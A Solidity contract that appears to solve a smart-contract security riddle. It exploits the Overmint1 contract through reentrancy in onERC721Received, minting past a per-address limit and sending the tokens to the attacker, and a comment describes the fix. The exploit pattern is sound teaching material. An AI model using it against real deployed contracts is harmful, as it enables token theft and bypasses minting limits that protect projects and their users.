// SPDX-License-Identifier: MIT
pragma solidity >=0.8.15;

import {Overmint1} from "../solidity-riddles/Overmint1.sol";
import {ERC721, IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

/**
 * @title AttackOvermint1
 * @dev This contract demonstrates an attack on the Overmint1 contract using onERC721Received reentrancy.
 */
contract AttackOvermint1 is IERC721Receiver {
    address private immutable overmint1Add;
    address private immutable attaker;

    constructor(address _overmint1Add) {
        overmint1Add = _overmint1Add;
        attaker = msg.sender;
    }

    /**
     * @dev To fix the vulnerability in the mint() function of the Overmint1 contract,
     * modify the mint() to update amountMinted before calling _safeMint
     */
    function exploitOvermint1() external {
        Overmint1 overmint1 = Overmint1(overmint1Add);
        overmint1.mint();
        for (uint256 i = 1; i < 6; ++i) {
            overmint1.safeTransferFrom(address(this), attaker, i);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) public override returns (bytes4 selector) {
        Overmint1 overmint1 = Overmint1(overmint1Add);
        if (overmint1.balanceOf(address(this)) < 5) {
            overmint1.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
